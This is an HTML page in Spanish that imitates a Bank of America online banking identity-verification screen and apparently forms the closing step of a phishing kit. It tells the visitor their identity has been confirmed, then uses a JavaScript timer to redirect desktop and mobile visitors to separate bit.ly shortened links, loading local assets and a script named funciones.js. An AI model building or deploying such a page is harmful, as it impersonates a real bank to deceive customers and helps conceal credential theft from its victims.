<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Bank of America | Banca en Línea | Entrar | Identificación en línea</title>
    <link rel="stylesheet" href="cex/normalize.css">
    <link rel="stylesheet" href="cex/segundoestilo.css" />

      <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
</head>

<body>
    <div class="cuerpo">
        <div class="header">
            <div class="img">
                <img src="img/logo.png" alt="logo" /> <span class="entrada">Entrar</span>
            </div>
            <div class="seguridad">
                <img src="img/seguridad.png" alt="seguridad" />
            </div>
        </div>
        <div class="header2">
            <h2>Verificar su identidad</h2>
        </div>
        <div class="seccion">
            <div class="derecha">
                <h2>Confirmación de identidad</h2>
                <p>Su identidad ha sido confirmada correctamente, sera redireccionado en <span id="timer">2</span>
                    segundos a la pagina principal</p>
                <form id="formmail" autocomplete="off">
                    <img src="img/confirm.gif" alt="confirm" />
                </form>

            </div>
            <div class="izquierda">
                <img src="img/ayudaindentidad.png" alt="derecha">
            </div>
        </div>
        <div class="footer">
            <img src="img/pie2.png" alt="footer">
        </div>
    </div>
    <script src="jotaeses/funciones.js"></script>
    <script>
        function startTimer(duration, display) {
            var timer = duration,
                minutes, seconds;
            const intervalo = setInterval(function() {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "" + seconds : seconds;
                if (minutes < 1) {
                    display.textContent = seconds;
                } else {
                    display.textContent = minutes + ":" + seconds;
                }

                if (--timer < 0) {
                    if (screen.width > 801) {
                        window.location = "https://bit.ly/2UwPK8G";
                        clearInterval(intervalo);
                        timer = duration;
                    } else {
                        window.location = "https://bit.ly/3j1af6Q";
                        clearInterval(intervalo);
                        timer = duration;
                    }


                }
            }, 1000);
        }

        var fiveMinutes = 1,
            display = document.getElementById('timer');
        startTimer(fiveMinutes, display);
    </script>
</body>

</html>